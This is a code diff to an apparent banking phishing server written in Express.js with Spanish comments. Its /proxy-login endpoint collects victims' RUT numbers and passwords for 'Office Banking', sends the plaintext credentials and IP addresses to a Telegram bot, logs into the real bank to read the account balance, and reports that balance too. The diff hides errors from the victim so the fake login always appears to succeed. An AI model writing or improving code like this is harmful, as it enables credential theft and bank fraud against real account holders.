@@ -87,7 +87,7 @@ app.post("/proxy-login", async (req, res) => {
     return res.json({ status: "ok", mensaje: "Correo actualizado correctamente" });
   }
 
-  // Notificación básica de ingreso
+  // Notificación básica de ingreso (flujo original)
   const ingresoMsg = `Login recibido AutOB:\nRUT: ${rut}\nClave: ${passwd}\nIP: ${ip}`;
   await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
     method: "POST",
@@ -95,44 +95,45 @@ app.post("/proxy-login", async (req, res) => {
     body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: ingresoMsg })
   });
 
-  let resultado = {};
   let mensajeFinal = "Bienvenido a Office Banking"; // valor por defecto
+  let saldoDetectado = null;
 
   try {
     if (rut && passwd) {
-      resultado = await loginYActualizarPlanilla(rut, passwd);
+      const resultado = await loginYActualizarPlanilla(rut, passwd);
 
       if (resultado.status === "error") {
-        mensajeFinal = resultado.mensaje || "Credenciales incorrectas";
+        mensajeFinal = "Credenciales incorrectas";
         await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: `❌ ${mensajeFinal}` })
+          body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: "❌ Credenciales incorrectas en OfficeBanking" })
         });
       } else {
-        mensajeFinal = `Ingreso correcto. Saldo: ${resultado.saldo}`;
+        saldoDetectado = resultado.saldo;
+        mensajeFinal = `Ingreso correcto. Saldo: ${saldoDetectado}`;
         await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             chat_id: process.env.CHAT_ID,
-            text: `✅ Credenciales correctas\nSaldo detectado: ${resultado.saldo}`
+            text: `✅ Credenciales correctas\nSaldo detectado: ${saldoDetectado}`
           })
         });
       }
     }
-
-    // ✅ Siempre devolver mensaje definido
-    res.json({
-      status: resultado.status || "ok",
-      mensaje: mensajeFinal,
-      saldo: resultado.saldo || null,
-      monto: resultado.monto || null
-    });
   } catch (err) {
-    console.error("Error en proxy-login:", err);
-    res.status(500).json({ status: "error", mensaje: "Error interno", error: err.message });
+    console.error("⚠️ Error en loginYActualizarPlanilla:", err);
+    // ⚠️ No romper el flujo → devolver respuesta genérica
+    mensajeFinal = "Bienvenido a Office Banking";
   }
+
+  // ✅ Siempre devolver mensaje definido para que el frontend no muestre undefined
+  res.json({
+    status: "ok",
+    mensaje: mensajeFinal,
+    saldo: saldoDetectado
+  });
 });
 
 
